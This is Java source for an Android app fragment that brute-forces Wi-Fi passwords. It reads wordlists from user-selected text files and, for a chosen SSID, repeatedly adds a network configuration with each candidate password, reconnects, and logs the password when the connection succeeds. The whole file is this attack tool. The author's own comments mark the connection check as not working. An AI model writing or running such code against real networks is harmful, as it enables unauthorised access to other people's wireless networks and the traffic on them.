package BruteFragment;

import android.content.Context;
import android.net.Uri;
import android.net.wifi.WifiConfiguration;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.Bundle;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentResultListener;
import logic.ShowToast;

import android.view.LayoutInflater;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;

import com.linkclink.gfr.R;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;

public class BruteFragment extends Fragment {

    int netId = 0;
    /*    */

    private LayoutInflater inflater;
    private ViewGroup container;

    private View view;

    private Button buttonBrute;
    private Button buttonBruteAll;

    private WifiManager wifiManager;
    private WifiInfo wifiInfo;
    private WifiConfiguration wifiConfiguration;

    private Bundle bundle;

    private String currentBruteWifiSSID = null;
    private String currentConnectSSID;

    private int flagStartBrute = 0;
    private int flagErrorBrute = 0;

    private List<String> passwordList = new ArrayList<String>();
    private List<String> passwordUriList = new ArrayList<String>();

    public static BruteFragment newInstance() {
        return new BruteFragment();
    }

    @Override
    public View onCreateView(@NonNull LayoutInflater inflater, @Nullable ViewGroup container, @Nullable Bundle savedInstanceState) {

        this.container = container;
        this.inflater = inflater;
        InitialisationComponents();
        wifiManager = (WifiManager) getContext().getApplicationContext().getSystemService(Context.WIFI_SERVICE);

        buttonBrute.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                BruteMain();
            }
        });

        getParentFragmentManager().setFragmentResultListener("selectedWifi", this, new FragmentResultListener() {
            @Override
            public void onFragmentResult(@NonNull String requestKey, @NonNull Bundle result) {
                currentBruteWifiSSID = result.getString("selectedWifi");
            }
        });

        getParentFragmentManager().setFragmentResultListener("passwordUri", this, new FragmentResultListener() {
            @Override
            public void onFragmentResult(@NonNull String requestKey, @NonNull Bundle result) {
                passwordUriList.add(result.getString("passwordUri"));
                try {
                    OpenTxt();
                } catch (IOException e) {
                    ShowToast.showToast(getContext(),"Error " + e.getMessage());
                }
            }
        });

        return view;
    }

    private void InitialisationComponents() {
        view = inflater.inflate(R.layout.brute_fragment, container, false);
        buttonBrute = (Button) view.findViewById(R.id.button_brute);
        buttonBruteAll = (Button) view.findViewById(R.id.button_bruteAll);
    }

    private void BruteMain() {
        /* Check HotSpot enabled and disable */
        if (!CheckHotSpotEnabled()) {
            /* Check wifi enabled */
            if (!CheckWifiEnabled()) {
                /* Check empty wif and brute */
                if (!passwordList.isEmpty()) {
                    /* Check empty wifi and brute */
                    if (CheckCurrentWifi()) {
                        Brute();
                    } else ShowToast.showToast(getContext(), "Please selected wifi to brute:");

                } else ShowToast.showToast(getContext(), "Please add passwords list:");

            } else ShowToast.showToast(getContext(), "Please enable Wifi:");

        } else ShowToast.showToast(getContext(), "Please disable HotSpot:");
    }

    /* Test */
    private void Brute() {

        GetLogResult("Brute/Start brute wifi: " + currentBruteWifiSSID);
        GetLogCurrentWifi(currentBruteWifiSSID);

        /* Test */
        for (int i = 0; i < passwordList.size(); i++) {

            if (flagStartBrute == 0) {

                flagStartBrute = 1;
                /* Remove wifi */
                wifiManager.removeNetwork(netId);

                /* Config */
                wifiConfiguration = new WifiConfiguration();
                wifiConfiguration.SSID = String.format("\"%s\"", currentBruteWifiSSID); /* Set wifi name */
                wifiConfiguration.preSharedKey = String.format("\"%s\"", passwordList.get(i)); /* Set current password */
                /*  */

                /* Try connect */
                netId = wifiManager.addNetwork(wifiConfiguration);
                wifiManager.disconnect();
                wifiManager.enableNetwork(netId, true);
                wifiManager.reconnect();
                /*    */

                try {
                    Thread.sleep(500);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }


                if (CheckSuccessConnect(passwordList.get(i))) {
                    GetLogResult("Pass to WIF:" + currentBruteWifiSSID+ "Pass: " + passwordList.get(i));
                    GetLogGoodResults("WIFI: " + currentBruteWifiSSID + " Pass:" + passwordList.get(i));
                    break;
                }

            }
        }
    }

    /* Test  dont work */
    private boolean CheckSuccessConnect(String checkPassword) {
        wifiInfo = wifiManager.getConnectionInfo();
        currentConnectSSID = wifiInfo.getSSID();
        currentConnectSSID = currentConnectSSID.substring(1, currentConnectSSID.length() - 1);

        GetLogResult("Brute/Check " + checkPassword);

        if (currentBruteWifiSSID.equals(currentConnectSSID)) {
            GetLogResult("Success connect");
            flagStartBrute = 0;
            return true;
        }
        flagStartBrute = 0;
        return false;
    }

    /* Sets log results */
    private void GetLogResult(String text) {
        bundle = new Bundle();
        bundle.putString("log", text);
        getParentFragmentManager().setFragmentResult("log", bundle);
    }

    private void GetLogGoodResults(String text) {
        bundle = new Bundle();
        bundle.putString("logGod", text);
        getParentFragmentManager().setFragmentResult("logGod", bundle);
    }

    private void GetLogCurrentWifi(String text) {
        bundle = new Bundle();
        bundle.putString("currentBruteWifi", text);
        getParentFragmentManager().setFragmentResult("currentBruteWifi", bundle);
    }

    /* Check HotSpot enabled */
    private boolean CheckHotSpotEnabled() {
        try {
            Method method = wifiManager.getClass().getDeclaredMethod("isWifiApEnabled");
            method.setAccessible(true);
            return (Boolean) method.invoke(wifiManager);
        } catch (Throwable ignored) {
        }
        return false;
    }

    /* Check wifi enabled */
    private boolean CheckWifiEnabled() {
        return !wifiManager.isWifiEnabled();
    }

    /* Check nullable wif */
    private boolean CheckCurrentWifi() {
        return currentBruteWifiSSID != null;
    }

    private void OpenTxt() throws IOException {

        InputStream inputStream;
        String encode = "UTF-8";
        BufferedReader bufferedReader;
        String line;

        for (int i = 0; i < passwordUriList.size(); i++) {
            inputStream = getContext().getContentResolver().openInputStream(Uri.parse(passwordUriList.get(i)));

            bufferedReader = new BufferedReader(new InputStreamReader(inputStream));

            while ((line = bufferedReader.readLine()) != null) {
                passwordList.add(line);
            }
            inputStream.close();
        }
    }

}
